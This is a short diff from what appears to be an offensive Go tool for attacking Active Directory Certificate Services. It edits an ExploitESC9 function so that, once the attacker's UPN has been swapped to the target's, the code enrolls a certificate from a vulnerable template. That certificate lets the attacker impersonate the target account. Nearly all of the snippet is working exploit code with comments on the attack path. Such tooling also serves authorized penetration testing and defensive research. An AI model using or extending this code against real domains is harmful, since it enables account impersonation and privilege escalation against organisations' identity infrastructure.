@@ -232,13 +232,12 @@ func ExploitESC9(cfg *ADCSConfig, templateName, attackerDN, targetUPN string) (*
 	}
 	fmt.Printf("[+] Attacker UPN changed to: %s\n", targetUPN)
 
-	// Step 3: Request certificate from vulnerable template
-	// We use ForgeCertificate directly rather than ExploitESC1, because the template
-	// may not be ESC1-vulnerable (no ENROLLEE_SUPPLIES_SUBJECT). The ESC9 attack path
-	// relies on the attacker's UPN being set to the target — the CA issues a cert with
-	// that UPN in the SAN but without the security extension.
-	fmt.Printf("[*] Step 3: Requesting certificate from template %q\n", templateName)
-	cert, certKey, err := ForgeCertificate(nil, targetUPN)
+	// Step 3: Enroll for a certificate from the vulnerable template.
+	// The ESC9 attack path relies on the attacker's UPN being set to the target — the
+	// CA issues a cert with that UPN in the SAN but without the security extension.
+	// After UPN swap, normal enrollment works because the attacker's UPN matches the target.
+	fmt.Printf("[*] Step 3: Enrolling for certificate from template %q\n", templateName)
+	cert, certKey, err := EnrollCertificate(cfg, templateName, targetUPN, false)
 	if err != nil {
 		// Step 4 (failure path): Restore UPN before returning error
 		restoreUPN()
